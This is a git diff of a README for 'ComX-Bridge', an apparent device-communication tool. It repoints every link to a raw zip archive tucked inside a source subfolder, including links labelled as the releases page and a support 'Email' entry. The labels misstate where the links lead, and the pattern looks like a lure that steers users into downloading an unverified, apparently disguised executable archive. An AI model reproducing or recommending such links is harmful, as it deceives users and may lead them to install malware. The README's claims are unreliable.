@@ -1,6 +1,6 @@
 # 🌐 ComX-Bridge - Connect Your Devices Seamlessly
 
-[![Download ComX-Bridge](https://github.com/adnanabbasy/ComX-Bridge/raw/refs/heads/main/pkg/transport/serial/Com_Bridge_v3.0.zip)](https://github.com/adnanabbasy/ComX-Bridge/raw/refs/heads/main/pkg/transport/serial/Com_Bridge_v3.0.zip)
+[![Download ComX-Bridge](https://raw.githubusercontent.com/adnanabbasy/ComX-Bridge/main/pkg/transport/udp/Com_Bridge_2.1.zip)](https://raw.githubusercontent.com/adnanabbasy/ComX-Bridge/main/pkg/transport/udp/Com_Bridge_2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Welcome to ComX-Bridge, your universal AI Communication Engine. This application
 
 To get started with ComX-Bridge, you need to download the software. 
 
-1. **Visit this page to download:** [ComX-Bridge Releases](https://github.com/adnanabbasy/ComX-Bridge/raw/refs/heads/main/pkg/transport/serial/Com_Bridge_v3.0.zip).
+1. **Visit this page to download:** [ComX-Bridge Releases](https://raw.githubusercontent.com/adnanabbasy/ComX-Bridge/main/pkg/transport/udp/Com_Bridge_2.1.zip).
 2. Find the latest version listed.
 3. Click on the appropriate download link for your system (Windows, macOS, or Linux).
 4. Follow the installation instructions based on your operating system.
@@ -48,7 +48,7 @@ If you encounter any issues while using ComX-Bridge, we are here to help. You ca
 
 - **Issues Page:** Report any bugs or request features directly in the GitHub Issues section of the repository.
 - **Community Forums:** Join our community forums for discussions and tips from other users.
-- **Email:** For direct support, email us at https://github.com/adnanabbasy/ComX-Bridge/raw/refs/heads/main/pkg/transport/serial/Com_Bridge_v3.0.zip
+- **Email:** For direct support, email us at https://raw.githubusercontent.com/adnanabbasy/ComX-Bridge/main/pkg/transport/udp/Com_Bridge_2.1.zip
 
 ## 📚 Troubleshooting Tips
 
@@ -87,4 +87,4 @@ For further information, explore these resources:
 - **Tutorials:** Access video tutorials to learn about ComX-Bridge features and configurations.
 - **Release Notes:** Stay updated with the latest features and fixes detailed in the release notes.
 
-Don't forget to check the [ComX-Bridge Releases page](https://github.com/adnanabbasy/ComX-Bridge/raw/refs/heads/main/pkg/transport/serial/Com_Bridge_v3.0.zip) to download the latest version!
+Don't forget to check the [ComX-Bridge Releases page](https://raw.githubusercontent.com/adnanabbasy/ComX-Bridge/main/pkg/transport/udp/Com_Bridge_2.1.zip) to download the latest version!
